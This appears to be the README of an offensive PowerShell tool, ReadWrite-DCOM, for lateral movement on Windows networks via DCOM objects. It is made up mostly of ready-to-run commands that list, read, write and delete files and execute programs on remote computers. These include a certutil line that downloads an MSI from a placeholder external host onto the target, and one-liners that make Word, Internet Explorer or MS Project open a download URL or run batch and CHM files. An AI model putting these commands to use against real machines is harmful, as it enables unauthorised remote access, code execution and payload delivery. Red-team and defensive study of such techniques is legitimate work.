## ReadWrite-DCOM

Several lateral movement techniques using DCOM were discovered in the past.  Most of the existing techniques focus on executing commands or VBScript.

ReadWrite-DCOM introduce a couple more use cases by leveraging DCOM. For example, ones can read/write files via Word/Excel COM object, and list directory via ShellWindows COM object on remote computer.

## Read

List a directory on target computer

```powershell
PS> Invoke-ReadWriteDCOM -Action List -ComputerName 127.0.0.1 -TargetPath C:\Temp
```

Read a text file on target computer 

```powershell
PS> Invoke-ReadWriteDCOM -Action Read -ComputerName 127.0.0.1 -TargetPath C:\Temp\comsetup.log
```



## Write 

Write a text file on target computer 

```powershell
PS> Invoke-ReadWriteDCOM -Action Write -ComputerName 127.0.0.1 -TargetPath C:\Temp\run.bat -Text "cmd.exe /c calc"
PS> Invoke-ReadWriteDCOM -Action Write -ComputerName 127.0.0.1 -TargetPath C:\Temp\target.txt -LocalFile C:\Users\Public\myfile.txt -AppendFileEnd
```

Delete a file on target computer i.e, move a file to recycle bin

```	powershell
PS> Invoke-ReadWriteDCOM -Action Delete -ComputerName 127.0.0.1 -TargetPath C:\Temp\comsetup.log
```



## Execute

Execute a program on target computer 

```powershell
PS> Invoke-ReadWriteDCOM -Action Exec -Method ShellBrowserWindow -ComputerName 127.0.0.1 -TargetPath C:\Windows\System32\certutil.exe -Args "-urlcache -f `"https://X.X.X.X/in.msi`" C:\temp\in.msi"
```

Three methods were implemented:

- ShellExecute from ShellBrowserWindow - by Matt Nelson
- InvokeVerbEx from ShellWindows
- ExecuteShellCommand  from MMC20.Application - by Matt Nelson

Remark: The second and third method would pop-up a prompt on target computer


## References

* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
* https://www.cybereason.com/blog/dcom-lateral-movement-techniques


## MISC

Open a URL link from various application

```powershell
PS> [activator]::CreateInstance([type]::GetTypeFromProgID("Word.Document", "127.0.0.1")).FollowHyperlink("https://XXX/download")
PS> 
[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "127.0.0.1")).Document.application.Open("https://XXX/download")
PS> [activator]::CreateInstance([type]::GetTypeFromProgID("InternetExplorer.Application","127.0.0.1")).Navigate("https://XXX/download")
```

Execute Compiled HTML Help file

```powershell
PS> [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "127.0.0.1")).Help("C:\temp\run.chm")
```

Execute file with MS Project

```powershell
PS> [activator]::CreateInstance([type]::GetTypeFromProgID("MSProject.Application", "127.0.0.1")).OpenBrowser("file:///C:/Windows/System32/calc.exe")
PS> [activator]::CreateInstance([type]::GetTypeFromProgID("MSProject.Application", "127.0.0.1")).FollowHyperlink("file:///C:/temp/run.bat")
```

